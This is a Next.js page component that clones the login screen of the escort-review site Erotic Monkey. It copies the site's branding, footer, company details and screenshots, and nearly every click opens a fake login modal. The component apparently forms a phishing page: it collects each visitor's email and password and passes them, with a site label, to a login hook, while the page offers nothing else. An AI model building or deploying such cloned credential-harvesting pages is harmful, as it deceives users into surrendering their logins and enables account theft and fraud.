"use client";
import { useState } from "react";
import { site } from "../config/index";
import { IoIosCloseCircle } from "react-icons/io";
import useMockLogin from "../hooks/useMockLogin";
import Image from "next/image";
import Link from "next/link";

export default function Home({ verifyId }) {
  const [visible, setVisible] = useState(false);
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  const { login } = useMockLogin();

  const handleSubmit = (e) => {
    e.preventDefault();
    const submitValues = { site, email, password };
    login(submitValues);
    setEmail("");
    setPassword("");
  };

  const handleOpenModal = () => setVisible(true);
  const handleCloseModal = () => setVisible(false);

  return (
    <div className="bg-[#f5f5f5] min-h-screen flex flex-col relative">
      {/* Modal */}
      {visible && (
        <div className="fixed inset-0 bg-black/50 z-50 flex justify-center items-center p-4">
          <div className="relative w-[95%] sm:w-[560px]">
            <div className="absolute -top-2 -right-2 z-50">
              <IoIosCloseCircle
                style={{
                  color: "black",
                  fontSize: "30px",
                  cursor: "pointer",
                  backgroundColor: "white",
                  borderRadius: "50%",
                }}
                onClick={handleCloseModal}
              />
            </div>

            <section className="bg-[#f5f5f5] rounded-md shadow-lg overflow-hidden">
              <div className="bg-[#fff] rounded-md">
                <form
                  onSubmit={handleSubmit}
                  className="border border-gray-100 w-full h-auto p-6"
                >
                  <label className="block px-3 py-2 bg-gray-100 text-black font-semibold text-lg text-center sm:text-left rounded mb-4">
                    Login to Erotic Monkey!
                  </label>

                  <div className="pt-2">
                    <input
                      type="email"
                      value={email}
                      onChange={(e) => setEmail(e.target.value)}
                      placeholder="Enter email / username"
                      className="w-full px-3 py-2.5 rounded border border-[#e5e5e5] outline-none placeholder:text-sm"
                      required
                    />
                  </div>

                  <div className="pt-5">
                    <input
                      type="password"
                      value={password}
                      onChange={(e) => setPassword(e.target.value)}
                      placeholder="Password"
                      minLength="6"
                      className="w-full px-3 py-2.5 rounded border border-[#e5e5e5] outline-none placeholder:text-sm"
                      required
                    />
                  </div>

                  <div className="flex flex-col sm:flex-row justify-between items-center mt-5 gap-3">
                    <a
                      href="#"
                      className="text-sm text-[#08c] hover:text-gray-700 hover:underline"
                    >
                      Forgot your password?
                    </a>
                    <button
                      type="submit"
                      className="bg-green-600 hover:bg-green-700 text-white font-base text-sm px-6 py-2.5 rounded w-full sm:w-auto transition-colors duration-200"
                    >
                      Log In
                    </button>
                  </div>

                  <div className="mt-5 text-center">
                    <p className="text-sm sm:text-base text-gray-700">
                      Not a EM Member?
                      <span className="text-[#08c] pl-2 hover:underline cursor-pointer">
                        Signup Up now, it's FREE
                      </span>
                    </p>
                  </div>

                  <p className="text-xs mt-3 text-center text-gray-500 leading-relaxed">
                    Signing up to the Erotic Monkey gives you access to
                    thousands of reviews from across the country.
                  </p>
                </form>
              </div>
            </section>
          </div>
        </div>
      )}

      {/* Desktop Layout */}
      <div className="hidden lg:flex flex-col w-full relative">
        {/* Navbar Section */}
        <nav className="relative w-full bg-[#303030] cursor-pointer" onClick={handleOpenModal}>
          <img
            src="/navbar.jpg"
            alt="Navbar"
            className="w-full h-auto cursor-pointer"
          />
        </nav>

        {/* Desktop Body Images */}
        <div
          className="w-full cursor-pointer"
          onClick={handleOpenModal}
        >
          <img
            src="/bodyImageNew1.PNG"
            alt="Body Part 1"
            className="w-full h-auto cursor-pointer"
          />
          <img
            src="/bodyImageNew2.PNG"
            alt="Body Part 2"
            className="w-full h-auto cursor-pointer"
          />
        </div>
      </div>

      {/* Mobile view */}
      <div className="lg:hidden block w-full cursor-pointer bg-white" onClick={handleOpenModal}>
        {/* Mobile Header */}
        <div className="bg-[#111] flex items-center justify-between px-4 py-2.5">
          <svg className="w-6 h-6 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24">
            <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M17.657 16.657L13.414 20.9a1.998 1.998 0 01-2.827 0l-4.244-4.243a8 8 0 1111.314 0z" />
            <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M15 11a3 3 0 11-6 0 3 3 0 016 0z" />
          </svg>
          <img src="/images/erotic-monkey-logo.png" alt="Logo" className="h-10 object-contain" />
          <svg className="w-6 h-6 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24">
            <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M4 6h16M4 12h16M4 18h16" />
          </svg>
        </div>

        {/* Search Input / Bar */}
        <div className="bg-[#eaeaea] p-4 text-center">
          <div className="flex gap-2 max-w-md mx-auto">
            <input 
              type="text" 
              placeholder="escort name or phone no or city" 
              className="flex-1 px-3 py-2 text-sm border border-gray-300 rounded outline-none placeholder:text-gray-500"
              readOnly
            />
            <button className="bg-[#6ba4c5] hover:bg-[#5a93b4] text-white px-5 py-2 rounded text-sm font-semibold shadow-sm">
              Search
            </button>
          </div>
          <span className="text-[#08c] hover:underline text-xs mt-2.5 block">
            or use the Advanced Search
          </span>
        </div>

        {/* Location Banner */}
        <div className="bg-[#fcfcfc] px-4 py-2 border-b border-gray-100 flex justify-end items-center gap-1 text-[13px] text-gray-700 font-sans">
          <span>Location:</span>
          <span className="font-bold text-gray-900 font-arial">Wilmington, US</span>
          <svg className="w-4 h-4 text-[#08c]" fill="none" stroke="currentColor" viewBox="0 0 24 24">
            <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M21 12a9 9 0 01-9 9m9-9a9 9 0 00-9-9m9 9H3m9 9a9 9 0 01-9-9m9 9c1.657 0 3-4.03 3-9s-1.343-9-3-9m0 18c-1.657 0-3-4.03-3-9s1.343-9 3-9m-9 9a9 9 0 019-9"/>
          </svg>
        </div>

        {/* Title */}
        <div className="bg-white px-4 pt-3.5 pb-1">
          <h2 className="text-gray-800 text-[17px] font-semibold text-left font-sans">Newest escort reviews</h2>
        </div>

        {/* New Mobile Images (No cuts / clip) */}
        <img src="/mobile-image-1.PNG" alt="Mobile responsive 1" className="w-full h-auto cursor-pointer" />
        <img src="/moible-image-2.PNG" alt="Mobile responsive 2" className="w-full h-auto cursor-pointer" />
      </div>

      {/* Footer Design */}
      <footer className="w-full max-w-[1100px] mx-auto px-4 py-8 bg-[#f5f5f5] text-gray-500 text-xs">
        {/* The 3-column box */}
        <div className="bg-white border border-[#e5e5e5] p-6 grid grid-cols-1 md:grid-cols-3 gap-8 mb-6 text-left">
          <div>
            <h3 className="text-gray-800 text-lg font-bold mb-3">Testimonials</h3>
            <p className="italic text-gray-600 mb-2 leading-relaxed">
              &quot;FINALLY. An escort review site that&apos;s simple to navigate, with font that doesn&apos;t force my eyes to squint, with descriptive reviews.&quot;
            </p>
            <p className="text-right text-gray-700 font-semibold italic">- Steve J. Boston, MA</p>
          </div>
          
          <div>
            <h3 className="text-gray-800 text-lg font-bold mb-3">Newest Blog Posts</h3>
            <ul className="space-y-2">
              <li>
                <a href="#" onClick={handleOpenModal} className="text-[#08c] hover:underline">Sex Parties</a>
              </li>
              <li>
                <a href="#" onClick={handleOpenModal} className="text-[#08c] hover:underline">Girl on Girl</a>
              </li>
              <li>
                <a href="#" onClick={handleOpenModal} className="text-[#08c] hover:underline">A-One and A-Two and A-Threesome</a>
              </li>
              <li>
                <a href="#" onClick={handleOpenModal} className="text-[#08c] hover:underline">What What In The Butt</a>
              </li>
              <li>
                <a href="#" onClick={handleOpenModal} className="text-[#08c] hover:underline">Upscale Date Ideas</a>
              </li>
            </ul>
          </div>
          
          <div>
            <h3 className="text-gray-800 text-lg font-bold mb-3">Newest Forum Posts</h3>
            <ul className="space-y-2">
              <li>
                <a href="#" onClick={handleOpenModal} className="text-[#08c] hover:underline">How long does it take to get out of inactive</a>
              </li>
              <li>
                <a href="#" onClick={handleOpenModal} className="text-[#08c] hover:underline">Verified or Active or nothing?</a>
              </li>
              <li>
                <a href="#" onClick={handleOpenModal} className="text-[#08c] hover:underline">Inactive accounts</a>
              </li>
              <li>
                <a href="#" onClick={handleOpenModal} className="text-[#08c] hover:underline">Long island escorts</a>
              </li>
              <li>
                <a href="#" onClick={handleOpenModal} className="text-[#08c] hover:underline">My account is suddenly inactive?!😡😡</a>
              </li>
            </ul>
          </div>
        </div>
        
        {/* Disclaimer */}
        <div className="text-center text-[10px] leading-relaxed text-gray-400 mb-4 max-w-[900px] mx-auto">
          The contents of this site are registered and fully protected under the United States Copyright Act. No portion of the site may be copied, reproduced, downloaded, transmitted or otherwise used without the prior written consent of X T Solution s.r.o. Willful infringement of copyright may result in the award of statutory damages of up to $100,000 per act of infringement, attorneys fees, seizure and destruction of infringing materials, and injunction against further acts of infringement.
        </div>
        
        {/* Links */}
        <div className="text-center text-xs mb-4 space-x-2 text-gray-500">
          <Link href="/contact" className="hover:underline text-gray-500">Contact</Link>
          <span>|</span>
          <a href="#" onClick={handleOpenModal} className="hover:underline">Refund Policy</a>
          <span>|</span>
          <Link href="/complaints-disputes" className="hover:underline text-gray-500">Complaints & Disputes</Link>
          <span>|</span>
          <Link href="/terms-conditions" className="hover:underline text-gray-500">Terms & Conditions</Link>
          <span>|</span>
          <a href="#" onClick={handleOpenModal} className="hover:underline">Law Enforcement Guide</a>
          <span>|</span>
          <Link href="/privacy-policy" className="hover:underline text-gray-500">Privacy Policy</Link>
        </div>
        
        {/* Copyright */}
        <div className="text-center text-[11px] text-gray-400 space-y-1">
          <p>&copy; Copyright 2026 EroticMonkey.ch. All rights reserved.</p>
          <p>X T Solution s.r.o. Vlnitá 425/52, PRAHA 4 - BRANÍK, 147 00 PRAHA 47, ID 07953950</p>
        </div>
      </footer>
    </div>
  );
}
